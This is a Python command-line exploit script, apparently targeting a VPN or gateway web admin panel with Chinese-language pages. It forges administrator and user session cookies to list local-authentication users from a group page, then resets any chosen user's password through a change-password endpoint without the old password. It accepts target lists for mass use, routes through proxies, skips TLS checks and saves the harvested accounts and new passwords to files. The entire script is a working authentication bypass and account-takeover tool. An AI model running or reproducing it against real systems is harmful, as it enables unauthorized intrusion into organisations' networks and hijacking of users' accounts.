import click
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
}


def check_poc1(url, group):
    header = {
        "Cookie": "admin_id=1; gw_admin_ticket=1;",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
    }
    path = "//admin/group/x_group.php?id=%s" % group
    print (path)
    r = requests.get(url + path, headers=header, proxies=proxy, verify=False)
    r.encoding = "utf-8"
    if r.status_code == 200 and "group_action.php" in r.text:
        #print (r.text)
        if users := re.findall("本地认证-&gt;(.*?)</option>", r.text):
            return users
        elif users := re.findall("本地认证->(.*?)</option>", r.text):
            return users
        else:
            print("[*]not found any user")
            return []


def check_poc2(url, user, pwd):
    header = {
        "Cookie": 'admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"%s","subAuthId":"1"}' % user,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Origin": url,
        "Referer": "%s/welcome.php" % url
    }
    body = {
        "old_pass": "",
        "password": pwd,
        "repassword": pwd
    }
    path = "/changepass.php?type=2"
    r = requests.post(url + path, headers=header, data=body, proxies=proxy, verify=False)
    #print(r.text)
    r.encoding = "utf-8"
    if r.status_code == 200 and "修改密码成功" in r.text:
        return True
    else:
        return False

def outputfilr(type,filename,data,logtxt):
    file = open(filename, 'a')
    if type == "lu":
        try:
            if data:
                file.write(logtxt+"\n    ".join(data))
                file.close()
            else:
                file.write(logtxt)
                file.close()
        except Exception as e:
            file.close()
            print("文件写入错误")
    elif type == "cp":
        file = open(filename, 'r+')
        try:
            content = file.read()
            file.seek(0,0)
            file.write(logtxt + content)
            file.close()
        except Exception as e:
            file.close()
            print("文件写入错误")

def getfilename(url):

    # 不需要http://
    split_url = url.split("//")
    # 对端口进行过滤
    domain = split_url[1].split(":")
    # print(split_url)
    filename = domain[0] + ".txt"
    return filename

def examine(target,group, user, pwd, list_user, change_pwd, proxies):
    global proxy
    if proxies:
        proxy = {
            "http": proxies,
            "https": proxies
        }
    target = target.strip().strip("/")
    print("target: " + target)
    filename = getfilename(target)
    if list_user:
        # print("list users~")
        if users := check_poc1(target, group):
            logtxt = "[+]The users of" + filename[0] + "are as follows：\n    "
            # 写入文件
            outputfilr("lu", filename, users, logtxt)
            # print("\n".join(users))
            print("[+]Get the user successfully, store in " + filename + "\n")
        else:
            # 写入文件
            logtxt = "[*]Unfortunately, no users were obtained"
            users = None
            outputfilr("lu", filename, users, logtxt)
            print("[*]Unfortunately, no users were obtained")

    if change_pwd:
        if status := check_poc2(target, user, pwd):
            # 写入文件
            logtxt = "[+]The password reset is successful, as follows:\n" + "    account:" + user + "\n" + "    password:" + pwd + "\n"
            data = None
            outputfilr("cp", filename, data, logtxt)

            print(
                "[+]The password reset is successful, as follows:\n" + "    account:" + user + "\n" + "    password:" + pwd + "\n")

        else:
            # 写入文件
            logtxt = "[*]Unfortunately, the password change failed\n"
            data = None
            outputfilr("cp", filename, data, logtxt)
            print("[*]Unfortunately, the password change failed")

@click.command()
@click.option("--target", "-t", help="Target")
@click.option("--targets", "-ts",help="multiple targets(-ts Specify your target file)")
@click.option("--group", "-g", default=2, help="User Group", type=int)
@click.option("--user", "-u", help="Username(default user：anonymous)")
@click.option("--pwd", "-p", default="abcdefg#123A", help="Password(default password：abcdefg#123A)")
@click.option("--list-user", "-lu", is_flag=True)
@click.option("--change-pwd", "-cp", is_flag=True)
@click.option("--proxy", "proxies")
def main(target,targets, group, user, pwd, list_user, change_pwd, proxies):
    # """
    # step1 :  list users exppoc
    #
    #     python exp.py -t https://1.1.1.1 -lu
    #
    #     user1
    #     user2
    #     ...
    #
    # step2 :  change password   org
    #
    #     python exp.py -t https://1.1.1.1 -u user1 -cp
    #
    #
    # """
    # 判断是单个目标还是多个目标
    if targets:
        for target in open(targets):
             examine(target,group, user, pwd, list_user, change_pwd, proxies)
    else:
        examine(target,group, user, pwd, list_user, change_pwd, proxies)


if __name__ == '__main__':
    main()